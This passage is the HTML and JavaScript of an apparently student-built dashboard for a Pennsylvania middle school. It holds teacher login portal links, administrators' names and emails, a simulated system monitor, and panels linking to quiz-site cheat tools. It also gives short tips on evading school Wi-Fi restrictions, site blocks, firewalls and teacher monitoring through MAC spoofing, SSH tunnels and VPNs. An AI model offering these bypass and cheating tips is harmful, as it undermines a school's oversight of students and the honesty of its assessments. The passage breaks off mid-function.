          <a href="https://sso.barracuda.com/u/login/identifier?state=hKFo2SBFYnNBRjVRYmczc2t0ZjlSNmwxel9GT25LZ2o3QzVDV6Fur3VuaXZlcnNhbC1sb2dpbqN0aWTZIDQ1U0hHOGVubzF0eE10WlhiSkRZRnNQSmJqY1dwcnFlo2NpZNkgQk1yY2JuRWdkS3BkSjZRWGVjN0hiRHdlTkpMUW1MSUk" target="_blank">Barracuda Network Access</a>
          <a href="https://shop.buyguernsey.com/thmBootstrapHome.aspx" target="_blank">Guernsey School Supply Portal</a>
          <a href="https://middletownsd.instructure.com/login/ldap" target="_blank">Canvas (Teacher Login)</a>
          <a href="https://caresolace.com/site/middletownarea" target="_blank">Care Solace Support</a>
          <a href="https://clever.com/oauth/authorize?channel=clever&client_id=4c63c1cf623dce82caac&confirmed=true&redirect_uri=https%3A%2F%2Fclever.com%2Fin%2Fauth_callback&response_type=code&state=27d11080794f14661a58c2ec9edba8d87e50eb0160eeb669cc1bea184ce72062&district_id=55b90d2693d0390100000379" target="_blank">Clever (Teacher Access)</a>
          <a href="https://www.discoveryeducation.com" target="_blank">Discovery Education Resources</a>
          <a href="https://raiderweb.gofmx.com/login" target="_blank">FMX Facility Management</a>
          <a href="https://login.frontlineeducation.com/login?signin=d0e98b785fd46dad06ce5509e61ef781&productId=ABSMGMT&clientId=ABSMGMT#/login" target="_blank">Frontline Education Portal</a>
          <a href="https://raiderweb.linkit.com/Account/LogOn?ReturnUrl=%2f#" target="_blank">LinkIt! (Teacher)</a>
          <a href="https://paetep.edulinksolutions.com/login" target="_blank">PA eTEP</a>
          <a href="https://powerschool.raiderweb.org/teachers/pw.html" target="_blank">PowerSchool Teacher Portal</a>
          <a href="https://go.schoolmessenger.com/#/home" target="_blank">SchoolMessenger Communications</a>
          <a href="https://www.pdesas.org/standard/" target="_blank">PDE SAS Standards</a>
          <a href="https://www.pbisapps.org" target="_blank">PBIS Apps</a>
          <a href="https://masd.happyfox.com/home/" target="_blank">HappyFox Support Desk</a>
          <a href="https://middletownasd-pa.safeschools.com/login" target="_blank">SafeSchools Training Portal</a>
          <a href="https://login.microsoftonline.com/common/oauth2/authorize?client_id=00000002-0000-0ff1-ce00-000000000000&redirect_uri=https%3a%2f%2foutlook.office.com%2fowa%2f&resource=00000002-0000-0ff1-ce00-000000000000&response_mode=form_post&response_type=code+id_token&scope=openid&msafed=1&msaredir=1&client-request-id=2318564a-0ba1-6e05-dc95-01e3d532fa2a&protectedtoken=true&claims=%7b%22id_token%22%3a%7b%22xms_cc%22%3a%7b%22values%22%3a%5b%22CP1%22%5d%7d%7d%7d&nonce=637946967978129696.e952fd14-38f0-4c99-9385-0e633dcd181b&state=DYu5EYAwDMAcOMYxiePgZxzI01KyPi6kU6MEAHuwBamEQIXVm7ioq1H1qHP6VdeghmyrYOvu6GwXlinMow8yelK8R36_O_8" target="_blank">Microsoft Office 365 Portal</a>
        </div>
      </div>

      <!-- Phone Directory Panel -->
      <div id="phoneDirectoryPanel" class="info-panel">
        <h2>üìû School Phone Directory Information</h2>
        <div class="coming-soon">
          School phone directory data is being compiled. Please check back later.
        </div>
      </div>

      <!-- Camera Panel -->
      <div id="cameraPanel" class="info-panel">
        <h2>üì∑ School Camera Information</h2>
        <div class="coming-soon">
          Access to live camera feeds is restricted. Information unavailable.
        </div>
      </div>

      <!-- School Info Panel -->
      <div id="schoolInfoPanel" class="info-panel">
        <h2>üè´ School Information</h2>
        <div class="school-info-grid">
          <div class="school-info-item">
            <div class="school-info-label">School Name:</div>
            <div>Middletown Area Middle School</div>
          </div>
          <div class="school-info-item">
            <div class="school-info-label">School Address:</div>
            <div>215 Oberlin Road Middletown, PA 17057</div>
          </div>
          <div class="school-info-item">
            <div class="school-info-label">School Phone:</div>
            <div>717-930-0739</div>
          </div>
          <div class="school-info-item">
            <div class="school-info-label">School Fax:</div>
            <div>717-944-0591</div>
          </div>
          <div class="school-info-item">
            <div class="school-info-label">School Principal:</div>
            <div>Dr. Shannon L. Wevodau</div>
          </div>
          <div class="school-info-item">
            <div class="school-info-label">Principal's Phone:</div>
            <div>717-930-0739</div>
          </div>
          <div class="school-info-item">
            <div class="school-info-label">Principal's Email:</div>
            <div>swevodau@raiderweb.org</div>
          </div>
          <div class="school-info-item">
            <div class="school-info-label">Assistant Principal:</div>
            <div>Mr. Michael DeFilippo</div>
          </div>
          <div class="school-info-item">
            <div class="school-info-label">Assistant Principal's Phone:</div>
            <div>717-930-0739</div>
          </div>
          <div class="school-info-item">
            <div class="school-info-label">Assistant Principal's Email:</div>
            <div>mdefilippo@raiderweb.org</div>
          </div>
        </div>
      </div>

      <!-- Exploit Panel -->
      <div id="exploitPanel" class="info-panel">
        <h2>üß® Exploiting Tools</h2>
        <div class="exploit-buttons">
          <a href="https://sites.google.com/view/tools-2/blooket-exploit" target="_blank">Blooket Cheats</a>
          <a href="https://sites.google.com/view/tools-2/kahoot-exploit" target="_blank">Kahoot Cheats</a>
          <a href="https://sites.google.com/view/tools-2/gimkit-exploit" target="_blank">Gimkit Cheats</a>
          <a href="https://sites.google.com/view/tools-2/quizlet-exploit" target="_blank">Quizlet Cheats</a>
          <a href="https://sites.google.com/view/tools-2/quizzes-exploit" target="_blank">Quizzes Cheats</a>
          <a href="https://sites.google.com/view/tools-2/quills-exploit" target="_blank">Quills Cheats</a>
          <a href="https://sites.google.com/view/tools-2/edpuzzle-exploit" target="_blank">Edpuzzle Cheats</a>
          <a href="https://sites.google.com/view/tools-2/nearpod-exploit" target="_blank">Nearpod Cheats</a>
          <a href="https://sites.google.com/view/tools-2/quizizz-exploit" target="_blank">Quizizz Cheats</a>
          <a href="https://sites.google.com/view/tools-2/blooket-hacks" target="_blank">Blooket Hacks</a>
        </div>
      </div>

      <!-- Bypass Panel -->
      <div id="bypassPanel" class="info-panel">
        <h2>üö™ Bypassing Tools</h2>
        <div class="bypass-buttons">
          <button onclick="dashboard.showBypassContent('bathroom')">Bathroom Pass Bypass</button>
          <button onclick="dashboard.showBypassContent('wifi')">School WiFi Bypass Methods</button>
          <button onclick="dashboard.showBypassContent('monitoring')">Teacher Monitoring Bypass</button>
          <button onclick="dashboard.showBypassContent('siteblock')">Site Block Bypass</button>
          <button onclick="dashboard.showBypassContent('firewall')">Firewall Bypass Techniques</button>
          <button onclick="dashboard.showBypassContent('vpn')">VPN Configuration Guides</button>
        </div>
        
        <div id="bathroomBypass" class="bypass-content">
          <h3>Bathroom Pass Bypass</h3>
          <p>Leveraging network vulnerabilities to gain unauthorized access to facilities.</p>
          <p><i>Method currently under research. Check back for updates.</i></p>
        </div>
        
        <div id="wifiBypass" class="bypass-content">
          <h3>School WiFi Bypass Methods</h3>
          <p>Refer to the 'School WiFi Information' panel for potential bypass vectors or unsecured SSIDs.</p>
          <p>MAC Address spoofing may be effective.</p>
        </div>
        
        <div id="monitoringBypass" class="bypass-content">
          <h3>Teacher Monitoring Bypass</h3>
          <p>Techniques to evade classroom monitoring software are complex.</p>
          <p>Consider browser isolation or virtual machines for advanced users.</p>
          <p><i>Check specialized forums for current exploits.</i></p>
        </div>

        <div id="siteblockBypass" class="bypass-content">
          <h3>Site Block Bypass</h3>
          <p>Utilize VPNs or proxy services listed in the VPN section.</p>
          <p>Web archives and alternative domains may also circumvent blocks.</p>
        </div>

        <div id="firewallBypass" class="bypass-content">
          <h3>Firewall Bypass Techniques</h3>
          <p>Port forwarding or using non-standard ports might bypass basic firewall rules.</p>
          <p>Encrypted tunnels (like SSH tunnels) are often effective.</p>
        </div>
        
        <div id="vpnBypass" class="bypass-content">
          <h3>VPN Configuration Guides</h3>
          <p>Guides for setting up various VPN services are available. Check the VPN Websites section.</p>
        </div>
      </div>

      <!-- VPN Panel -->
      <div id="vpnPanel" class="info-panel">
        <h2>üîê VPN Websites</h2>
        <div class="links-list">
          <a href="https://nordvpn.com" target="_blank">NordVPN</a>
          <a href="https://expressvpn.com" target="_blank">ExpressVPN</a>
          <a href="https://protonvpn.com" target="_blank">ProtonVPN</a>
          <a href="https://surfshark.com" target="_blank">Surfshark</a>
          <a href="https://www.cyberghostvpn.com" target="_blank">CyberGhost VPN</a>
          <a href="https://www.privateinternetaccess.com" target="_blank">Private Internet Access</a>
          <a href="https://www.tunnelbear.com" target="_blank">TunnelBear</a>
          <a href="https://www.hotspotshield.com" target="_blank">Hotspot Shield</a>
        </div>
      </div>

      <!-- Gaming Panel -->
      <div id="gamingPanel" class="info-panel">
        <h2>üéÆ Gaming Websites</h2>
        <div class="coming-soon">
          Educational gaming platforms and resources are being curated.
        </div>
      </div>

      <!-- Music Panel -->
      <div id="musicPanel" class="info-panel">
        <h2>üéµ Music Websites</h2>
        <div class="coming-soon">
          Curated list of educational music platforms coming soon.
        </div>
      </div>

      <!-- Keyboard Panel -->
      <div id="keyboardPanel" class="info-panel">
        <h2>üéπ Keyboard Shortcuts & Tricks</h2>
        <div class="info-text">
          <h3>General System Shortcuts</h3>
          <p><b>Spotlight Search:</b> Command (‚åò) + Spacebar</p>
          <p><b>Return to Home:</b> Command (‚åò) + H</p>
          <p><b>App Switcher:</b> Command (‚åò) + Tab (Hold for menu)</p>
          <p><b>Force Quit:</b> Command (‚åò) + Option (‚å•) + Esc</p>
          <p><b>Take Screenshot (Full):</b> Command (‚åò) + Shift + 3</p>
          <p><b>Take Screenshot (Selection):</b> Command (‚åò) + Shift + 4</p>
          <p><b>Open Quick Note:</b> Globe + Q</p>
          <p><b>Open Siri:</b> Globe + S</p>

          <h3>Safari & Web Shortcuts</h3>
          <p><b>New Tab:</b> Command (‚åò) + T</p>
          <p><b>Close Tab:</b> Command (‚åò) + W</p>
          <p><b>Reopen Last Closed Tab:</b> Shift + Command (‚åò) + T</p>
          <p><b>Go to Next Tab:</b> Control (‚åÉ) + Tab or Command (‚åò) + }</p>
          <p><b>Go to Previous Tab:</b> Shift + Control (‚åÉ) + Tab or Command (‚åò) + {</p>
          <p><b>Open New Window:</b> Command (‚åò) + N</p>
          <p><b>Open Private Window:</b> Shift + Command (‚åò) + N</p>
          <p><b>Scroll to Top:</b> Command (‚åò) + Up Arrow</p>
          <p><b>Scroll to Bottom:</b> Command (‚åò) + Down Arrow</p>

          <h3>Text Editing</h3>
          <p><b>Select All:</b> Command (‚åò) + A</p>
          <p><b>Copy:</b> Command (‚åò) + C</p>
          <p><b>Cut:</b> Command (‚åò) + X</p>
          <p><b>Paste:</b> Command (‚åò) + V</p>
          <p><b>Undo:</b> Command (‚åò) + Z</p>
          <p><b>Redo:</b> Command (‚åò) + Shift + Z</p>

          <p><i>Press and hold Command (‚åò) to see app-specific shortcuts.</i></p>
        </div>
      </div>
    </div> <!-- End of #infoPanelsContainer -->

    <!-- Canvas Container (Notes) -->
    <div id="canvasContainer">
      <h2>üñåÔ∏è Notes Canvas</h2>
      <canvas id="notesCanvas" width="800" height="500"></canvas> <!-- Slightly larger canvas -->
      <div id="canvasControls">
        <button id="clearCanvasBtn">Clear Canvas</button>
        <button id="closeCanvasBtn">Close Notes</button>
      </div>
    </div>
  </div>

  <!-- Modals -->
  <div id="newTaskModal" class="modal">
    <div class="modal-content">
      <div class="modal-header">
        <h2>New Task</h2>
        <button class="close-btn">&times;</button>
      </div>
      <div class="modal-body">
        <form id="newTaskForm">
          <label for="taskName">Task Name:</label>
          <input type="text" id="taskName" placeholder="e.g., System Scan" required />
          
          <label for="taskCpu">Simulated CPU Usage (%):</label>
          <input type="number" id="taskCpu" placeholder="e.g., 5.5" step="0.1" min="0" max="100" required />
          
          <label for="taskMemory">Simulated Memory Usage (MB):</label>
          <input type="number" id="taskMemory" placeholder="e.g., 120" min="0" required />
          
          <button type="submit">Add Task</button>
        </form>
      </div>
    </div>
  </div>

  <div id="fmNewFolderModal" class="modal">
    <div class="modal-content">
      <div class="modal-header">
        <h2>Create New Folder</h2>
        <button class="close-btn">&times;</button>
      </div>
      <div class="modal-body">
        <form id="fmNewFolderForm">
          <label for="folderName">Folder Name:</label>
          <input type="text" id="folderName" placeholder="e.g., Documents" required />
          <button type="submit">Create Folder</button>
        </form>
      </div>
    </div>
  </div>

  <script>
    // Dashboard functionality object
    const dashboard = {
      // App Configuration
      config: {
        updateInterval: 5000, // ms for system monitoring
        taskUpdateInterval: 2000, // ms for task manager updates
        logInterval: 3000, // ms for generating new log entries
        reminderCheckInterval: 60000, // ms for checking reminders
        initialCPU: 20, initialRAM: 40, initialDisk: 60, initialNet: 50,
        maxCPU: 100, maxRAM: 16000, maxDisk: 1000, // MB for disk
        maxNet: 1000 // Mbps
      },

      // State variables
      state: {
        sessionSeconds: 0,
        currentCPU: 0,
        currentRAM: 0,
        currentDisk: 0,
        currentNet: 0,
        tasks: [],
        files: [],
        reminders: [],
        logs: [],
        users: [],
        currentPath: '/',
        isFullscreen: false,
        zoomLevel: 1,
        theme: 'dark', // 'dark' or 'light'
        animationsEnabled: true,
        currentFileEditorContent: '',
        activeModal: null
      },

      // DOM References
      refs: {},

      // Initialize all dashboard functionality
      init: function() {
        this.cacheDOM();
        this.bindEvents();
        this.initSessionTimer();
        this.initClock();
        this.generateCalendar();
        this.initThemeToggle();
        this.initCanvas();
        this.initPanels();
        this.initQuickBar();
        this.initSystemMonitoring();
        this.initTaskManager();
        this.initFileManager();
        this.initReminderSystem();
        this.initSystemLogs();
        this.initUserManagement();
        this.initAdvancedSettings();
        this.initNetworkUtilities();
        this.loadInitialData(); // Load simulated data
      },

      cacheDOM: function() {
        this.refs = {
          body: document.getElementById('bodyElement'),
          dashboard: document.getElementById('dashboard'),
          loginBox: document.getElementById('loginBox'),
          sessionTimeBtn: document.getElementById('sessionTime'),
          realTimeClockBtn: document.getElementById('realTimeClock'),
          realDateBtn: document.getElementById('realDate'),
          notesBtn: document.getElementById('notesBtn'),
          exportNotesBtn: document.getElementById('exportNotesBtn'),
          screenshotBtn: document.getElementById('screenshotBtn'),
          toggleSectionsBtn: document.getElementById('toggleSectionsBtn'),
          fixIssuesBtn: document.getElementById('fixIssuesBtn'),
          fullScreenBtn: document.getElementById('fullScreenBtn'),
          zoomInBtn: document.getElementById('zoomInBtn'),
          zoomOutBtn: document.getElementById('zoomOutBtn'),
          restartBtn: document.getElementById('restartBtn'),
          panicBtn: document.getElementById('panicBtn'),
          themeToggleBtn: document.getElementById('themeToggle'),
          logoutBtn: document.getElementById('logoutBtn'),
          announcementBar: document.getElementById('announcementBar'),
          mainGrid: document.getElementById('mainGrid'),
          canvasContainer: document.getElementById('canvasContainer'),
          notesCanvas: document.getElementById('notesCanvas'),
          canvasControls: document.getElementById('canvasControls'),
          clearCanvasBtn: document.getElementById('clearCanvasBtn'),
          closeCanvasBtn: document.getElementById('closeCanvasBtn'),
          
          // Panel References
          systemMonitorPanel: document.getElementById('systemMonitorPanel'),
          taskManagerPanel: document.getElementById('taskManagerPanel'),
          fileManagerPanel: document.getElementById('fileManagerPanel'),
          reminderPanel: document.getElementById('reminderPanel'),
          systemLogsPanel: document.getElementById('systemLogsPanel'),
          userManagementPanel: document.getElementById('userManagementPanel'),
          advancedSettingsPanel: document.getElementById('advancedSettingsPanel'),
          networkUtilitiesPanel: document.getElementById('networkUtilitiesPanel'),
          wifiPanel: document.getElementById('wifiPanel'),
          ipadPanel: document.getElementById('ipadPanel'),
          handbookPanel: document.getElementById('handbookPanel'),
          mapPanel: document.getElementById('mapPanel'),
          studentWebsitesPanel: document.getElementById('studentWebsitesPanel'),
          teacherWebsitesPanel: document.getElementById('teacherWebsitesPanel'),
          phoneDirectoryPanel: document.getElementById('phoneDirectoryPanel'),
          cameraPanel: document.getElementById('cameraPanel'),
          schoolInfoPanel: document.getElementById('schoolInfoPanel'),
          exploitPanel: document.getElementById('exploitPanel'),
          bypassPanel: document.getElementById('bypassPanel'),
          vpnPanel: document.getElementById('vpnPanel'),
          gamingPanel: document.getElementById('gamingPanel'),
          musicPanel: document.getElementById('musicPanel'),
          keyboardPanel: document.getElementById('keyboardPanel'),

          // Monitoring Refs
          cpuUsageBar: document.getElementById('cpuUsageBar'),
          ramUsageBar: document.getElementById('ramUsageBar'),
          diskUsageBar: document.getElementById('diskUsageBar'),
          netSpeedBar: document.getElementById('netSpeedBar'),

          // Task Manager Refs
          newTaskBtn: document.getElementById('newTaskBtn'),
          taskTableBody: document.getElementById('taskTableBody'),

          // File Manager Refs
          currentPathDiv: document.getElementById('currentPath'),
          fmNewFolderBtn: document.getElementById('fmNewFolderBtn'),
          fmUploadBtn: document.getElementById('fmUploadBtn'),
          fileListRoot: document.getElementById('fileListRoot'),

          // Reminder Refs
          reminderMessage: document.getElementById('reminderMessage'),
          reminderDateTime: document.getElementById('reminderDateTime'),
          addReminderBtn: document.getElementById('addReminderBtn'),
          reminderList: document.getElementById('reminderList'),

          // System Logs Refs
          logViewer: document.getElementById('logViewer'),

          // User Management Refs
          newUserUsername: document.getElementById('newUserUsername'),
          newUserPassword: document.getElementById('newUserPassword'),
          newUserID: document.getElementById('newUserID'),
          newUserRole: document.getElementById('newUserRole'),
          newUserRank: document.getElementById('newUserRank'),
          addUserBtn: document.getElementById('addUserBtn'),
          userTableBody: document.getElementById('userTableBody'),

          // Advanced Settings Refs
          settingAnimations: document.getElementById('settingAnimations'),
          settingAnimationSpeed: document.getElementById('settingAnimationSpeed'),
          settingGlowIntensity: document.getElementById('settingGlowIntensity'),
          settingAutoRefresh: document.getElementById('settingAutoRefresh'),
          settingTaskUpdate: document.getElementById('settingTaskUpdate'),
          settingMonitorUpdate: document.getElementById('settingMonitorUpdate'),
          settingAutoLockout: document.getElementById('settingAutoLockout'),
          settingLockoutTimeout: document.getElementById('settingLockoutTimeout'),
          settingSuspiciousAlert: document.getElementById('settingSuspiciousAlert'),

          // Network Utilities Refs
          pingTarget: document.getElementById('pingTarget'),
          pingBtn: document.getElementById('pingBtn'),
          pingOutput: document.getElementById('pingOutput'),
          traceTarget: document.getElementById('traceTarget'),
          traceBtn: document.getElementById('traceBtn'),
          traceOutput: document.getElementById('traceOutput'),

          // Modals
          newTaskModal: document.getElementById('newTaskModal'),
          fmNewFolderModal: document.getElementById('fmNewFolderModal'),
          newTaskForm: document.getElementById('newTaskForm'),
          fmNewFolderForm: document.getElementById('fmNewFolderForm'),
          closeModalBtns: document.querySelectorAll('.modal .close-btn')
        };

        // Initial settings loading
        this.loadSettings();
      },

      bindEvents: function() {
        // Quick Bar Buttons
        this.refs.sessionTimeBtn.addEventListener('click', () => {}); // Handled by initSessionTimer
        this.refs.realTimeClockBtn.addEventListener('click', () => {}); // Handled by initClock
        this.refs.realDateBtn.addEventListener('click', () => {}); // Handled by initClock
        this.refs.notesBtn.addEventListener('click', () => this.toggleNotesCanvas());
        this.refs.exportNotesBtn.addEventListener('click', () => this.exportNotes());
        this.refs.screenshotBtn.addEventListener('click', () => this.takeScreenshot());
        this.refs.toggleSectionsBtn.addEventListener('click', () => this.toggleMainSections());
        this.refs.fixIssuesBtn.addEventListener('click', () => this.runDiagnostics());
        this.refs.fullScreenBtn.addEventListener('click', () => this.toggleFullScreen());
        this.refs.zoomInBtn.addEventListener('click', () => this.zoomIn());
        this.refs.zoomOutBtn.addEventListener('click', () => this.zoomOut());
        this.refs.restartBtn.addEventListener('click', () => this.restartPage());
        this.refs.panicBtn.addEventListener('click', () => this.panicAction());
        this.refs.themeToggleBtn.addEventListener('click', () => this.toggleTheme());
        this.refs.logoutBtn.addEventListener('click', () => this.logout());

        // Canvas Controls
        this.refs.clearCanvasBtn.addEventListener('click', () => this.clearCanvas());
        this.refs.closeCanvasBtn.addEventListener('click', () => this.toggleNotesCanvas());

        // Task Manager Modal Events
        this.refs.newTaskBtn.addEventListener('click', () => this.openModal(this.refs.newTaskModal));
        this.refs.newTaskForm.addEventListener('submit', (e) => this.handleNewTaskSubmit(e));

        // File Manager Events
        this.refs.fmNewFolderBtn.addEventListener('click', () => this.openModal(this.refs.fmNewFolderModal));
        this.refs.fmNewFolderForm.addEventListener('submit', (e) => this.handleNewFolderSubmit(e));
        this.refs.fmUploadBtn.addEventListener('click', () => this.handleFileUpload());

        // Reminder System Events
        this.refs.addReminderBtn.addEventListener('click', () => this.addReminder());

        // User Management Events
        this.refs.addUserBtn.addEventListener('click', () => this.addUser());

        // Network Utilities Events
        this.refs.pingBtn.addEventListener('click', () => this.simulatePing());
        this.refs.traceBtn.addEventListener('click', () => this.simulateTrace());

        // Close Modal Buttons
        this.refs.closeModalBtns.forEach(btn => btn.addEventListener('click', () => this.closeModal()));
        window.addEventListener('click', (e) => {
            if (e.target === this.refs.newTaskModal || e.target === this.refs.fmNewFolderModal) {
                this.closeModal();
            }
        });
        document.addEventListener('keydown', (e) => {
            if (e.key === 'Escape' && this.state.activeModal) {
                this.closeModal();
            }
        });

        // Settings Change Listeners
        this.refs.settingAnimations.addEventListener('change', () => this.saveSettings());
        this.refs.settingAnimationSpeed.addEventListener('change', () => this.saveSettings());
        this.refs.settingGlowIntensity.addEventListener('change', () => this.saveSettings());
        this.refs.settingAutoRefresh.addEventListener('change', () => this.saveSettings());
        this.refs.settingTaskUpdate.addEventListener('change', () => this.saveSettings());
        this.refs.settingMonitorUpdate.addEventListener('change', () => this.saveSettings());
        this.refs.settingAutoLockout.addEventListener('change', () => this.handleAutoLockoutSetting());
        this.refs.settingSuspiciousAlert.addEventListener('change', () => this.saveSettings());
      },
      
      loadSettings: function() {
          const settings = JSON.parse(localStorage.getItem('dashboardSettings')) || {};
          this.state.animationsEnabled = settings.animationsEnabled !== false; // Default true
          this.refs.settingAnimations.checked = this.state.animationsEnabled;
          
          const animSpeed = settings.animationSpeed || 500;
          this.refs.settingAnimationSpeed.value = animSpeed;
          if (!this.state.animationsEnabled) this.refs.settingAnimationSpeed.disabled = true;

          const glowIntensity = settings.glowIntensity !== undefined ? settings.glowIntensity : 0.7;
          this.refs.settingGlowIntensity.value = glowIntensity;
          document.documentElement.style.setProperty('--glow-intensity', glowIntensity); // Apply to CSS variable

          this.refs.settingAutoRefresh.value = settings.autoRefresh || 15;
          this.refs.settingTaskUpdate.value = settings.taskUpdate || 2000;
          this.refs.settingMonitorUpdate.value = settings.monitorUpdate || 3000;

          this.refs.settingAutoLockout.checked = settings.autoLockout || false;
          this.refs.settingLockoutTimeout.value = settings.lockoutTimeout || 5;
          this.refs.settingLockoutTimeout.disabled = !this.refs.settingAutoLockout.checked;
          
          this.refs.settingSuspiciousAlert.checked = settings.suspiciousAlert !== false; // Default true
          
          this.applySettingsToUI();
      },
      
      saveSettings: function() {
          this.state.animationsEnabled = this.refs.settingAnimations.checked;
          this.state.animationSpeed = parseInt(this.refs.settingAnimationSpeed.value);
          this.state.glowIntensity = parseFloat(this.refs.settingGlowIntensity.value);
          this.state.autoRefresh = parseInt(this.refs.settingAutoRefresh.value);
          this.state.taskUpdate = parseInt(this.refs.settingTaskUpdate.value);
          this.state.monitorUpdate = parseInt(this.refs.settingMonitorUpdate.value);
          this.state.autoLockout = this.refs.settingAutoLockout.checked;
          this.state.lockoutTimeout = parseInt(this.refs.settingLockoutTimeout.value);
          this.state.suspiciousAlert = this.refs.settingSuspiciousAlert.checked;

          // Apply settings immediately
          this.applySettingsToUI();

          localStorage.setItem('dashboardSettings', JSON.stringify(this.state));
      },
      
      applySettingsToUI: function() {
          // Animations
          if (!this.state.animationsEnabled) {
              document.body.style.transition = 'none'; // Disable body transitions
              document.querySelectorAll('.box, .info-panel, .quick-bar button, .modal-content').forEach(el => {
                  el.style.transition = 'none';
                  el.style.animation = 'none'; // Disable animations
              });
              this.refs.settingAnimationSpeed.disabled = true;
          } else {
              document.body.style.transition = 'background-color 0.4s, color 0.4s';
              document.querySelectorAll('.box, .info-panel, .quick-bar button, .modal-content').forEach(el => {
                  el.style.transition = 'all 0.4s cubic-bezier(0.25, 0.8, 0.25, 1)';
              });
              this.refs.settingAnimationSpeed.disabled = false;
          }
          // Apply custom animation speed if applicable (though this is complex to apply globally like this)
          // The real effect is on CSS keyframes, which are harder to adjust dynamically without reloading styles.
          // For simplicity, we'll note this limitation for this implementation.
          
          // Glow Intensity
          document.documentElement.style.setProperty('--glow-intensity', this.state.glowIntensity);

          // Auto-Refresh Rate - This would typically affect data fetching, not UI elements directly
          // We'll use this value in JS for simulated updates.

          // Task Manager Update Interval
          // Used in initTaskManager

          // System Monitor Update
          // Used in initSystemMonitoring

          // Auto Lockout
          this.refs.settingLockoutTimeout.disabled = !this.state.autoLockout;
      },
      
      handleAutoLockoutSetting: function() {
          this.state.autoLockout = this.refs.settingAutoLockout.checked;
          this.refs.settingLockoutTimeout.disabled = !this.state.autoLockout;
          this.saveSettings(); // Save immediately
      },

      // Initialize session timer
      initSessionTimer: function() {
        this.state.sessionSeconds = 0; // Reset on init
        function formatTime(seconds) {
          const hrs = String(Math.floor(seconds / 3600)).padStart(2, '0');
          const mins = String(Math.floor((seconds % 3600) / 60)).padStart(2, '0');
          const secs = String(seconds % 60).padStart(2, '0');
          return `${hrs}:${mins}:${secs}`;
        }
        
        const updateSessionTime = () => {
          this.state.sessionSeconds++;
          this.refs.sessionTimeBtn.innerText = `‚è≥ Session Time: ${formatTime(this.state.sessionSeconds)}`;
        };
        
        updateSessionTime(); // Call once immediately
        this.sessionTimerInterval = setInterval(updateSessionTime, 1000);
      },
      
      // Initialize real-time clock
      initClock: function() {
        const updateClock = () => {
          const now = new Date();
          const options = { hour: 'numeric', minute: 'numeric', second: 'numeric', hour12: true };
          const timeStr = now.toLocaleTimeString(undefined, options);
          const dateStr = now.toLocaleDateString(undefined, { weekday: 'short', month: 'numeric', day: 'numeric', year: 'numeric' });

          this.refs.realTimeClockBtn.innerText = 'üïí ' + timeStr;
          this.refs.realDateBtn.innerText = 'üìÖ ' + dateStr;
        };
        
        updateClock(); // Call once immediately
        this.clockInterval = setInterval(updateClock, 1000);
      },
      
      // Generate calendar
      generateCalendar: function() {
        this.refs.calendar.innerHTML = ''; 
        const days = ['Sun', 'Mon', 'Tue', 'Wed', 'Thu', 'Fri', 'Sat'];
        days.forEach(day => {
          const div = document.createElement('div');
          div.className = 'day-header';
          div.innerText = day;
          this.refs.calendar.appendChild(div);
        });

        const date = new Date();
        const year = date.getFullYear();
        const month = date.getMonth();
        const today = date.getDate();

        const firstDayOfMonth = new Date(year, month, 1);
        const firstDayOfWeek = firstDayOfMonth.getDay();
        const lastDateOfMonth = new Date(year, month + 1, 0).getDate();

        // Add empty cells for days before the 1st of the month
        for (let i = 0; i < firstDayOfWeek; i++) {
          const emptyCell = document.createElement('div');
          emptyCell.className = 'empty-day';
          this.refs.calendar.appendChild(emptyCell);
        }

        // Add days of the month
        for (let i = 1; i <= lastDateOfMonth; i++) {
          const cell = document.createElement('div');
          cell.innerText = i;
          if (i === today) {
            cell.classList.add('today');
          }
          // Add event listener for clicking on a day
          cell.addEventListener('click', () => this.selectCalendarDay(year, month, i));
          this.refs.calendar.appendChild(cell);
        }
      },
      
      // Initialize theme toggle
      initThemeToggle: function() {
        this.refs.themeToggleBtn.addEventListener('click', () => this.toggleTheme());
        // Set initial theme based on saved settings or preference
        if (localStorage.getItem('dashboardTheme') === 'light') {
            this.applyTheme('light');
        } else {
            this.applyTheme('dark'); // Default to dark
        }
      },
      
      applyTheme: function(theme) {
          this.state.theme = theme;
          if (theme === 'light') {
              this.refs.body.classList.add('light-theme');
              this.refs.themeToggleBtn.innerText = 'üåô Dark Mode';
          } else {
              this.refs.body.classList.remove('light-theme');
              this.refs.themeToggleBtn.innerText = '‚òÄÔ∏è Light Mode';
          }
          localStorage.setItem('dashboardTheme', theme);
      },
      
      toggleTheme: function() {
          if (this.state.theme === 'dark') {
              this.applyTheme('light');
          } else {
              this.applyTheme('dark');
          }
      },

      // Initialize buttons with specific actions
      initButtons: function() {
        // These are mostly for login, but some dashboard buttons are handled in bindEvents
      },
      
      // Initialize canvas for notes
      initCanvas: function() {
        const canvas = this.refs.notesCanvas;
        const ctx = canvas.getContext('2d');

        // Set initial canvas state (background)
        ctx.fillStyle = this.refs.body.classList.contains('light-theme') ? '#f0f0f0' : '#1f1f1f';
        ctx.fillRect(0, 0, canvas.width, canvas.height);

        let isDrawing = false;
        let lastPos = { x: 0, y: 0 };

        function getCanvasPos(evt) {
          const rect = canvas.getBoundingClientRect();
          // Handle touch and mouse events
          const clientX = evt.clientX || (evt.touches && evt.touches[0].clientX);
          const clientY = evt.clientY || (evt.touches && evt.touches[0].clientY);
          return {
            x: clientX - rect.left,
            y: clientY - rect.top
          };
        }

        const startDrawing = (e) => {
          isDrawing = true;
          lastPos = getCanvasPos(e);
          ctx.beginPath();
          ctx.moveTo(lastPos.x, lastPos.y);
          e.preventDefault(); // Prevent default touch/mouse behavior
        };

        const draw = (e) => {
          if (!isDrawing) return;
          const pos = getCanvasPos(e);
          ctx.lineTo(pos.x, pos.y);
          ctx.strokeStyle = this.refs.body.classList.contains('light-theme') ? '#994d00' : '#ff914d'; // Color based on theme
          ctx.lineWidth = 3; // Slightly thicker line
          ctx.lineCap = 'round';
          ctx.stroke();
          lastPos = pos;
          e.preventDefault();
        };

        const stopDrawing = (e) => {
          isDrawing = false;
          e.preventDefault();
        };

        // Mouse Events
        canvas.addEventListener('mousedown', startDrawing.bind(this));
        canvas.addEventListener('mousemove', draw.bind(this));
        canvas.addEventListener('mouseup', stopDrawing.bind(this));
        canvas.addEventListener('mouseleave', stopDrawing.bind(this)); // Stop drawing if mouse leaves canvas

        // Touch Events
        canvas.addEventListener('touchstart', startDrawing.bind(this));
        canvas.addEventListener('touchmove', draw.bind(this));
        canvas.addEventListener('touchend', stopDrawing.bind(this));
        canvas.addEventListener('touchcancel', stopDrawing.bind(this)); // Stop drawing on touch cancel
        
        // Add event for color picker if needed in future, for now, hardcoded based on theme
      },
      
      clearCanvas: function() {
